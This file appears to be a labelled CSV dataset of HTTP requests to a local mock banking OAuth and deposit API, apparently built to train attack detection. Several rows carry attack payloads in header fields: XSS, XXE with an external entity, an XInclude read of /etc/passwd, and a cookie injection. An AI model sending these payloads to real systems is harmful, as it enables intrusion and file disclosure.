request.url,request.method,request.header.authorization,request.headers.user-agent,request.header.x-api-tran-id,request.header.x-api-type,request.header.x-csrf-token,request.headers.cookie,request.headers.set_cookie,request.headers.content-length,request.body,response.body,response.status,attack.type
http://localhost:4200/api/v2/bank/accounts/deposit/detail,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI0MWM5ZGFmZi03M2VmLTQyODYtYjY5YS1kYmQ4N2M1M2Y5NjYiLCJleHAiOjE3Mzk2OTAxNTUsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY1NTV9.gCjZbLHsr3HevBe5noYPT0XYrOW9FlGjAaCcB-rGirA,node,anya123456SRFCHUVW1L4B2DL,regular,,,,99,"""{\""org_code\"":\""bond123456\"",\""account_num\"":\""5028248300\"",\""next\"":\""0\"",\""search_timestamp\"":\""20250216061555\""}""","""{\""rsp_code\"":\""0000\"",\""rsp_msg\"":\""Success\"",\""search_timestamp\"":\""2025-02-16T06:15:55.907Z\"",\""detail_cnt\"":1,\""detailList\"":[{\""currency_code\"":\""KRW\"",\""balance_amt\"":\""755930.686\"",\""withdrawable_amt\"":\""755738.416\"",\""offered_rate\"":\""0.031\"",\""last_paid_in_cnt\"":7}]}""",200,
http://localhost:4200/api/oauth/2.0/token,POST,,Mozilla/5.0,anya123456SDGJLI6AXYN8NC1,,,,session=admin123; Path=/,583,"""{\""tx_id\"":\""MD_anya123456_bond123456_RA20250003_certauth00_20250216061844_XXAB00490000\"",\""org_code\"":\""anya123456\"",\""grant_type\"":\""password\"",\""client_id\"":\""anya123456clientid\"",\""client_secret\"":\""anya123456clientsecret\"",\""ca_code\"":\""RA20250003\"",\""username\"":\""MTAzOTE4\"",\""request_type\"":\""1\"",\""password_len\"":\""12\"",\""password\"":\""UEFTU1dPUkQ=\"",\""auth_type\"":\""1\"",\""consent_type\"":\""1\"",\""consent_len\"":\""16\"",\""consent\"":\""Y29uc2VudC0wMDM=\"",\""signed_person_info_req_len\"":\""24\"",\""signed_person_info_req\"":\""RXNwZXJhbnphUG9sbGljaA==\"",\""consent_nonce\"":\""L2025502516509511595\"",\""ucpid_nonce\"":\""C2025385625245422710\"",\""cert_tx_id\"":\""202502160618444294f7b06d8f46129d55c39530\"",\""service_id\"":\""anya123456160220250001\""}""","""{\""rsp_code\"":\""0000\"",\""rsp_msg\"":\""Success\"",\""tx_id\"":\""MD_anya123456_bond123456_RA20250003_certauth00_20250216061844_XXAB00490000\"",\""token_type\"":\""Bearer\"",\""access_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI0YmQwM2MwOC01ZDQyLTQ5YjUtOWE1OS0yZWFjZWRkMTZhNDMiLCJleHAiOjE3Mzk2OTAzMjYsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3MjZ9.PvyAwsPX_YwcN8xroLcR_4NO7cVqtVn5l2QSf49z4e8\"",\""expires_in\"":3600,\""refresh_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiIzMWFmZjJhNi01ZWE2LTQ0M2YtYTMzNy03YmQ4MDZhMzI2YTYiLCJleHAiOjE3Mzk3NzMxMjYsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3MjZ9.7LANIF--OcPZK5X5bVuAix0o3V_xJ-HA5Zy28wWN61k\"",\""refresh_token_expires_in\"":86400}""",200,CookieInjection
http://localhost:4200/api/v2/bank/accounts/deposit/detail,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI0YmQwM2MwOC01ZDQyLTQ5YjUtOWE1OS0yZWFjZWRkMTZhNDMiLCJleHAiOjE3Mzk2OTAzMjYsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3MjZ9.PvyAwsPX_YwcN8xroLcR_4NO7cVqtVn5l2QSf49z4e8,Mozilla/5.0,anya123456SDST7TZRZQM7KMH,,,,,99,"""{\""org_code\"":\""bond123456\"",\""account_num\"":\""6525103657\"",\""next\"":\""0\"",\""search_timestamp\"":\""20250216061847\""}""","""{\""code\"":\""1004\"",\""message\"":\""Invalid or missing x-api-type\""}""",400,
http://localhost:4200/api/oauth/2.0/token,POST,,Mozilla/5.0,anya123456SH4YP1E5EPSHN5Q,,,,,583,"""{\""tx_id\"":\""MD_anya123456_bond123456_RA20250003_certauth00_20250216061853_XXAB00490000\"",\""org_code\"":\""anya123456\"",\""grant_type\"":\""password\"",\""client_id\"":\""anya123456clientid\"",\""client_secret\"":\""anya123456clientsecret\"",\""ca_code\"":\""RA20250003\"",\""username\"":\""NDg0Mzc5\"",\""request_type\"":\""1\"",\""password_len\"":\""12\"",\""password\"":\""UEFTU1dPUkQ=\"",\""auth_type\"":\""1\"",\""consent_type\"":\""1\"",\""consent_len\"":\""16\"",\""consent\"":\""Y29uc2VudC0wMDE=\"",\""signed_person_info_req_len\"":\""24\"",\""signed_person_info_req\"":\""RmVsaXBhUnVub2xmc3Nvbg==\"",\""consent_nonce\"":\""O2025774590740598189\"",\""ucpid_nonce\"":\""W2025577658943713165\"",\""cert_tx_id\"":\""202502160618531cd29e29e4a145c2bfc67140f3\"",\""service_id\"":\""anya123456160220250001\""}""","""{\""rsp_code\"":\""0000\"",\""rsp_msg\"":\""Success\"",\""tx_id\"":\""MD_anya123456_bond123456_RA20250003_certauth00_20250216061853_XXAB00490000\"",\""token_type\"":\""Bearer\"",\""access_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI4ZWJhOWUwZi00YWNkLTRlYTAtOGI5NC01Y2FlYTMwMTBhMGUiLCJleHAiOjE3Mzk2OTAzMzUsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3MzV9.XkpTI_vSEG1L-pflf3InQOm5wJj6n9A69OVS_JVZqqM\"",\""expires_in\"":3600,\""refresh_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiIyZWMxNGJiYy1iZjEzLTQ1ZDYtOTk3Ni01NTkwZWYyNGVmOGQiLCJleHAiOjE3Mzk3NzMxMzUsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3MzV9.k1do1CnABlbxHFHHX8bhixwVePKukXwF6ct3JovYZOM\"",\""refresh_token_expires_in\"":86400}""",200,
http://localhost:4200/api/v2/bank/accounts/deposit/basic,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI4ZWJhOWUwZi00YWNkLTRlYTAtOGI5NC01Y2FlYTMwMTBhMGUiLCJleHAiOjE3Mzk2OTAzMzUsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3MzV9.XkpTI_vSEG1L-pflf3InQOm5wJj6n9A69OVS_JVZqqM,Mozilla/5.0,anya123456SLR5CWKJJ0YNGPV,,,,,99,"""{\""org_code\"":\""bond123456\"",\""account_num\"":\""8516407668\"",\""next\"":\""0\"",\""search_timestamp\"":\""20250216061855\""}""","""{\""code\"":\""1004\"",\""message\"":\""Invalid or missing x-api-type\""}""",400,
http://localhost:4200/api/oauth/2.0/token,POST,,Mozilla/5.0,anya123456SLR2WDQQFH0HRLH,,,,,577,"""{\""tx_id\"":\""MD_anya123456_bond123456_RA20250003_certauth00_20250216061901_XXAB00490000\"",\""org_code\"":\""anya123456\"",\""grant_type\"":\""password\"",\""client_id\"":\""anya123456clientid\"",\""client_secret\"":\""anya123456clientsecret\"",\""ca_code\"":\""RA20250003\"",\""username\"":\""OTIzNjMx\"",\""request_type\"":\""1\"",\""password_len\"":\""12\"",\""password\"":\""UEFTU1dPUkQ=\"",\""auth_type\"":\""1\"",\""consent_type\"":\""1\"",\""consent_len\"":\""16\"",\""consent\"":\""Y29uc2VudC0wMDI=\"",\""signed_person_info_req_len\"":\""20\"",\""signed_person_info_req\"":\""SGF5bGV5R290dGxpZWI=\"",\""consent_nonce\"":\""F2025428838724576292\"",\""ucpid_nonce\"":\""A2025517348255423988\"",\""cert_tx_id\"":\""20250216061901fafacd72f536457f810aa6a03e\"",\""service_id\"":\""anya123456160220250001\""}""","""{\""rsp_code\"":\""0000\"",\""rsp_msg\"":\""Success\"",\""tx_id\"":\""MD_anya123456_bond123456_RA20250003_certauth00_20250216061901_XXAB00490000\"",\""token_type\"":\""Bearer\"",\""access_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiIwYThlOWE3Zi00Njg5LTRjNGMtODhjMC02ZGNkNWI1OThlNjgiLCJleHAiOjE3Mzk2OTAzNDIsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3NDJ9.HXXrJ7p2e1rZCWfzzSQX1ilklGjNSQGcs30ZeYk5Vu4\"",\""expires_in\"":3600,\""refresh_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI0ODEwMTI5ZS03YmNhLTQzYTAtOWZmMC1iMTAwZjVkYWJhYTQiLCJleHAiOjE3Mzk3NzMxNDIsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3NDJ9.5rOnC9OMzWXntCdFhb5RwAeuGiy3Mf9R9rXwDlaWFKA\"",\""refresh_token_expires_in\"":86400}""",200,
http://localhost:4200/api/v2/bank/accounts/deposit/basic,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiIwYThlOWE3Zi00Njg5LTRjNGMtODhjMC02ZGNkNWI1OThlNjgiLCJleHAiOjE3Mzk2OTAzNDIsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3NDJ9.HXXrJ7p2e1rZCWfzzSQX1ilklGjNSQGcs30ZeYk5Vu4,Mozilla/5.0,anya123456SGIDT1O4VAEDZXO,,,,k807,99,"""{\""org_code\"":\""bond123456\"",\""account_num\"":\""8516926607\"",\""next\"":\""0\"",\""search_timestamp\"":\""20250216061903\""}""","""{\""code\"":\""1004\"",\""message\"":\""Invalid or missing x-api-type\""}""",400,
http://localhost:4200/api/oauth/2.0/token,POST,,Mozilla/5.0,anya123456SQQWBR2QROANDVB,,,,,575,"""{\""tx_id\"":\""MD_anya123456_bond123456_RA20250001_certauth00_20250216061908_XXAB00490000\"",\""org_code\"":\""anya123456\"",\""grant_type\"":\""password\"",\""client_id\"":\""anya123456clientid\"",\""client_secret\"":\""anya123456clientsecret\"",\""ca_code\"":\""RA20250001\"",\""username\"":\""MDM3MzUx\"",\""request_type\"":\""1\"",\""password_len\"":\""12\"",\""password\"":\""UEFTU1dPUkQ=\"",\""auth_type\"":\""1\"",\""consent_type\"":\""1\"",\""consent_len\"":\""16\"",\""consent\"":\""Y29uc2VudC0wMDI=\"",\""signed_person_info_req_len\"":\""20\"",\""signed_person_info_req\"":\""QmF5bGVlV2lsa2luc29u\"",\""consent_nonce\"":\""X2025867636686723127\"",\""ucpid_nonce\"":\""J2025717010071794491\"",\""cert_tx_id\"":\""2025021606190830144233ab054e8eb609493fb9\"",\""service_id\"":\""anya123456160220250001\""}""","""{\""rsp_code\"":\""0000\"",\""rsp_msg\"":\""Success\"",\""tx_id\"":\""MD_anya123456_bond123456_RA20250001_certauth00_20250216061908_XXAB00490000\"",\""token_type\"":\""Bearer\"",\""access_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI0MjMyZGIxZC1lN2UzLTQ2ZTUtOWY5OC03NjExOTdkMjM2MzgiLCJleHAiOjE3Mzk2OTAzNTAsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3NTB9.88K-qiGl6LTl8jXqlSnjUznVutzn2BufKW0v8dpua8s\"",\""expires_in\"":3600,\""refresh_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiJlNTU0YmQxYy1kOTAwLTQ5OGItYWJmYi03YzRhYWYzYzUyOTciLCJleHAiOjE3Mzk3NzMxNTAsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3NTB9.gymYY841zWVJnQUYsSj0r1QCXwviKR2AkU8DDyfcl1s\"",\""refresh_token_expires_in\"":86400}""",200,
http://localhost:4200/api/v2/bank/accounts/deposit/basic,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI0MjMyZGIxZC1lN2UzLTQ2ZTUtOWY5OC03NjExOTdkMjM2MzgiLCJleHAiOjE3Mzk2OTAzNTAsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3NTB9.88K-qiGl6LTl8jXqlSnjUznVutzn2BufKW0v8dpua8s,Mozilla/5.0,"<img src=""x"" onerror=""alert('XSS')"">",,,,,99,"""{\""org_code\"":\""bond123456\"",\""account_num\"":\""2102921481\"",\""next\"":\""0\"",\""search_timestamp\"":\""20250216061911\""}""","""{\""code\"":\""1003\"",\""message\"":\""Invalid or missing x-api-tran-id\""}""",400,XSS
http://localhost:4200/api/oauth/2.0/token,POST,,Mozilla/5.0,anya123456SVU8XCX7RJWC2KR,,"<img src=""x"" onerror=""alert('XSS')"">",,,581,"""{\""tx_id\"":\""MD_anya123456_bond123456_RA20250001_certauth00_20250216061916_XXAB00490000\"",\""org_code\"":\""anya123456\"",\""grant_type\"":\""password\"",\""client_id\"":\""anya123456clientid\"",\""client_secret\"":\""anya123456clientsecret\"",\""ca_code\"":\""RA20250001\"",\""username\"":\""NjcyMjIy\"",\""request_type\"":\""1\"",\""password_len\"":\""12\"",\""password\"":\""UEFTU1dPUkQ=\"",\""auth_type\"":\""1\"",\""consent_type\"":\""1\"",\""consent_len\"":\""16\"",\""consent\"":\""Y29uc2VudC0wMDI=\"",\""signed_person_info_req_len\"":\""24\"",\""signed_person_info_req\"":\""QWxsaXNvbk1hY2Vqa292aWM=\"",\""consent_nonce\"":\""K2025512210466306728\"",\""ucpid_nonce\"":\""U2025582695879595055\"",\""cert_tx_id\"":\""20250216061916ce7e7b3f9d0d4066bb27d3a137\"",\""service_id\"":\""anya123456160220250001\""}""","""{\""rsp_code\"":\""0000\"",\""rsp_msg\"":\""Success\"",\""tx_id\"":\""MD_anya123456_bond123456_RA20250001_certauth00_20250216061916_XXAB00490000\"",\""token_type\"":\""Bearer\"",\""access_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI0YjVjZGNiOS00MDliLTQ4OTEtYTI4NS1jZDdlYjVhMTRjZGQiLCJleHAiOjE3Mzk2OTAzNTksInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3NTl9.w0EoM_ShPVt3OvPoEOYD4qX6VLCoqijEkwbFd-w5xL4\"",\""expires_in\"":3600,\""refresh_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiJhZWMxYTQ2NS1hOTQ1LTQxMGYtODJjZC0zOWY5NDU5NTliODUiLCJleHAiOjE3Mzk3NzMxNTksInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3NTl9.3DU4WcC_4UpuMnMZUrp8fc9Y5QOIPtvsJ0kBFjv4Mho\"",\""refresh_token_expires_in\"":86400}""",200,XSS
http://localhost:4200/api/oauth/2.0/token,POST,,Mozilla/5.0,,,,,,581,"""{\""tx_id\"":\""MD_anya123456_bond123456_RA20250002_certauth00_20250216061939_XXAB00490000\"",\""org_code\"":\""anya123456\"",\""grant_type\"":\""password\"",\""client_id\"":\""anya123456clientid\"",\""client_secret\"":\""anya123456clientsecret\"",\""ca_code\"":\""RA20250002\"",\""username\"":\""MDk4NzU3\"",\""request_type\"":\""1\"",\""password_len\"":\""12\"",\""password\"":\""UEFTU1dPUkQ=\"",\""auth_type\"":\""1\"",\""consent_type\"":\""1\"",\""consent_len\"":\""16\"",\""consent\"":\""Y29uc2VudC0wMDI=\"",\""signed_person_info_req_len\"":\""24\"",\""signed_person_info_req\"":\""VmljZW50ZUxpbmQtRmFkZWw=\"",\""consent_nonce\"":\""S2025981759618695956\"",\""ucpid_nonce\"":\""U2025460551567929552\"",\""cert_tx_id\"":\""20250216061939363085a587484295a280cb6419\"",\""service_id\"":\""anya123456160220250001\""}""","""{\""code\"":\""2000\"",\""message\"":\""Invalid parameters provided\""}""",400,
http://localhost:4200/api/oauth/2.0/token,POST,,Mozilla/5.0,anya123456SH6IVWVQUHLMSLO,,,,,566,"""{\""tx_id\"":\""MD_anya123456_bond123456_RA20250001_certauth00_20250216061951_XXAB00490000\"",\""org_code\"":\""anya123456\"",\""grant_type\"":\""password\"",\""client_id\"":\""anya123456clientid\"",\""client_secret\"":\""anya123456clientsecret\"",\""ca_code\"":\""RA20250001\"",\""username\"":\""2\"",\""request_type\"":\""1\"",\""password_len\"":\""12\"",\""password\"":\""UEFTU1dPUkQ=\"",\""auth_type\"":\""1\"",\""consent_type\"":\""1\"",\""consent_len\"":\""16\"",\""consent\"":\""Y29uc2VudC0wMDE=\"",\""signed_person_info_req_len\"":\""16\"",\""signed_person_info_req\"":\""QXNobGVlTW9yYXI=\"",\""consent_nonce\"":\""R2025455259671827172\"",\""ucpid_nonce\"":\""Z2025191713351848727\"",\""cert_tx_id\"":\""2025021606195159571a65395c44899f0e595605\"",\""service_id\"":\""anya123456160220250001\""}""","""{\""rsp_code\"":\""0000\"",\""rsp_msg\"":\""Success\"",\""tx_id\"":\""MD_anya123456_bond123456_RA20250001_certauth00_20250216061951_XXAB00490000\"",\""token_type\"":\""Bearer\"",\""access_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI3MThmZTBiZi05NDIyLTQyMjMtOTgxOS1hYTFhMzJmMTg0NjEiLCJleHAiOjE3Mzk2OTAzOTMsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3OTN9.23pIAm27Hxq-mUjMIl_0qwDiS-zd27zZ1hI7uZJ_cmQ\"",\""expires_in\"":3600,\""refresh_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiJlNGI5MWY0ZS03YzE1LTRmNjktOTllZi1hOWQ4OGNkZGEwM2YiLCJleHAiOjE3Mzk3NzMxOTMsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3OTN9.TVwpKa7zP0ejBBDdtejZvHLSmJpKy-54pe5bxTAfnBU\"",\""refresh_token_expires_in\"":86400}""",200,
http://localhost:4200/api/v2/bank/accounts/deposit/basic,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiI3MThmZTBiZi05NDIyLTQyMjMtOTgxOS1hYTFhMzJmMTg0NjEiLCJleHAiOjE3Mzk2OTAzOTMsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY3OTN9.23pIAm27Hxq-mUjMIl_0qwDiS-zd27zZ1hI7uZJ_cmQ,Mozilla/5.0,anya123456SIRQYQXE4HI1ND6,,,,ozVymWjDujkiMyU0KN0,99,"""{\""org_code\"":\""bond123456\"",\""account_num\"":\""0549520781\"",\""next\"":\""0\"",\""search_timestamp\"":\""20250216061953\""}""","""{\""code\"":\""1004\"",\""message\"":\""Invalid or missing x-api-type\""}""",400,
http://localhost:4200/api/oauth/2.0/token,POST,,"<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://example.com/xxe"" >]><foo>&xxe;</foo>",anya123456SHL8NRNAVUCNLMU,,,,,571,"""{\""tx_id\"":\""MD_anya123456_bond123456_RA20250001_certauth00_20250216061959_XXAB00490000\"",\""org_code\"":\""anya123456\"",\""grant_type\"":\""password\"",\""client_id\"":\""anya123456clientid\"",\""client_secret\"":\""anya123456clientsecret\"",\""ca_code\"":\""RA20250001\"",\""username\"":\""NzE1MDk1\"",\""request_type\"":\""1\"",\""password_len\"":\""12\"",\""password\"":\""UEFTU1dPUkQ=\"",\""auth_type\"":\""1\"",\""consent_type\"":\""1\"",\""consent_len\"":\""16\"",\""consent\"":\""Y29uc2VudC0wMDI=\"",\""signed_person_info_req_len\"":\""16\"",\""signed_person_info_req\"":\""RW1tZXRCYXJyb3dz\"",\""consent_nonce\"":\""Q2025673201377519725\"",\""ucpid_nonce\"":\""X2025100647458206162\"",\""cert_tx_id\"":\""202502160619593a1ad72aa5a4422bb50a740394\"",\""service_id\"":\""anya123456160220250001\""}""","""{\""rsp_code\"":\""0000\"",\""rsp_msg\"":\""Success\"",\""tx_id\"":\""MD_anya123456_bond123456_RA20250001_certauth00_20250216061959_XXAB00490000\"",\""token_type\"":\""Bearer\"",\""access_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiIxNjM4ZTRjMC0wYzhkLTQ0MjktOTllNC1lMmQ4YmY2MDA4ZWEiLCJleHAiOjE3Mzk2OTA0MDEsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY4MDF9.YGwhtqEDEgIWlPViSK69QKZGRDFVHR2m0ajy62Kx8Sw\"",\""expires_in\"":3600,\""refresh_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiJlYjg5N2VhNi0zMzUyLTRmNGEtYjcwZi1iZmEzZjJkZDUyNDQiLCJleHAiOjE3Mzk3NzMyMDEsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY4MDF9.QDU4IiJNlS8_A5bNOWNpyf4Lyu6VqTPyGVJuwnmX-jk\"",\""refresh_token_expires_in\"":86400}""",200,XXE
http://localhost:4200/api/v2/bank/accounts/deposit/basic,POST,Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiIxNjM4ZTRjMC0wYzhkLTQ0MjktOTllNC1lMmQ4YmY2MDA4ZWEiLCJleHAiOjE3Mzk2OTA0MDEsInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY4MDF9.YGwhtqEDEgIWlPViSK69QKZGRDFVHR2m0ajy62Kx8Sw,Mozilla/5.0,anya123456SV4LRGBK0H9YQT9,,,,,99,"""{\""org_code\"":\""bond123456\"",\""account_num\"":\""5387196166\"",\""next\"":\""0\"",\""search_timestamp\"":\""20250216062001\""}""","""{\""code\"":\""1004\"",\""message\"":\""Invalid or missing x-api-type\""}""",400,
http://localhost:4200/api/oauth/2.0/token,POST,,Mozilla/5.0,anya123456SGR553YRC3OLEDP,,,,,567,"""{\""tx_id\"":\""MD_anya123456_bond123456_RA20250003_certauth00_20250216062007_XXAB00490000\"",\""org_code\"":\""anya123456\"",\""grant_type\"":\""password\"",\""client_id\"":\""anya123456clientid\"",\""client_secret\"":\""anya123456clientsecret\"",\""ca_code\"":\""RA20250003\"",\""username\"":\""ODYyMjE3\"",\""request_type\"":\""1\"",\""password_len\"":\""12\"",\""password\"":\""UEFTU1dPUkQ=\"",\""auth_type\"":\""1\"",\""consent_type\"":\""1\"",\""consent_len\"":\""16\"",\""consent\"":\""Y29uc2VudC0wMDE=\"",\""signed_person_info_req_len\"":\""12\"",\""signed_person_info_req\"":\""T3Jsb0JveWxl\"",\""consent_nonce\"":\""S2025197742181973001\"",\""ucpid_nonce\"":\""E2025950045620572622\"",\""cert_tx_id\"":\""20250216062007a08003d64f8447fc97893e3d90\"",\""service_id\"":\""anya123456160220250001\""}""","""{\""rsp_code\"":\""0000\"",\""rsp_msg\"":\""Success\"",\""tx_id\"":\""MD_anya123456_bond123456_RA20250003_certauth00_20250216062007_XXAB00490000\"",\""token_type\"":\""Bearer\"",\""access_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiJjZGZlMWQzZS05NzBhLTQ5YzgtODQ3YS05MGFmNmU1ZjlkOTAiLCJleHAiOjE3Mzk2OTA0MDksInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY4MDl9.ZYmerCUhID-BsKRGCiYm2LcUu-o_Pb2DtvKfcFpoAD0\"",\""expires_in\"":3600,\""refresh_token\"":\""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhbnlhMTIzNDU2Y2xpZW50aWQiLCJqdGkiOiIyMDBmNDdmNi02NTcxLTRhZmUtODY0ZC1iYmY5NWIzYzA2N2EiLCJleHAiOjE3Mzk3NzMyMDksInNjb3BlIjoiaXAiLCJpYXQiOjE3Mzk2ODY4MDl9.nM30i4h-kXclJXv1Frq7UtJoSmgXseUmnDCRASnEBrs\"",\""refresh_token_expires_in\"":86400}""",200,
http://localhost:4200/api/oauth/2.0/token,POST,,Mozilla/5.0,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include parse=""text"" href=""file:///etc/passwd""/></foo>",,,,,579,"""{\""tx_id\"":\""MD_anya123456_bond123456_RA20250001_certauth00_20250216062023_XXAB00490000\"",\""org_code\"":\""anya123456\"",\""grant_type\"":\""password\"",\""client_id\"":\""anya123456clientid\"",\""client_secret\"":\""anya123456clientsecret\"",\""ca_code\"":\""RA20250001\"",\""username\"":\""NzAyOTc2\"",\""request_type\"":\""1\"",\""password_len\"":\""12\"",\""password\"":\""UEFTU1dPUkQ=\"",\""auth_type\"":\""1\"",\""consent_type\"":\""1\"",\""consent_len\"":\""16\"",\""consent\"":\""Y29uc2VudC0wMDE=\"",\""signed_person_info_req_len\"":\""20\"",\""signed_person_info_req\"":\""VGFyeW5TaGFuYWhhbg==\"",\""consent_nonce\"":\""L2025453214730065368\"",\""ucpid_nonce\"":\""G2025463522113222327\"",\""cert_tx_id\"":\""20250216062023cfa95162ffa144889fb6585f67\"",\""service_id\"":\""anya123456160220250001\""}""","""{\""code\"":\""2000\"",\""message\"":\""Invalid parameters provided\""}""",400,XXE
